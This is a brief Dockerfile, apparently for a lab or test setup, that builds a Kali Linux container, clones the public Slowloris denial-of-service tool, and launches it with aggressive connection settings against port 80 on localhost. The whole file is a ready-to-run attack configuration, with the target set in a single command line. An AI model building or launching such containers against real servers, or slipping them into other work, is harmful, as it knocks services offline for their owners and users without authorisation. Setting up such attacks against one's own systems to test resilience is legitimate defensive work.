# SLOWLORIS ATTACKER DOCKER FILE
FROM kalilinux/kali-rolling

# Install dependencies
RUN apt-get update && apt-get install -y git python3 python3-pip

# Clone Slowloris from GitHub
RUN git clone https://github.com/gkbrk/slowloris.git /slowloris
WORKDIR /slowloris

# Run the attack script with aggressive settings
CMD ["python3", "slowloris.py", "-s", "100", "-p", "80", "--sleeptime", "1", "localhost"]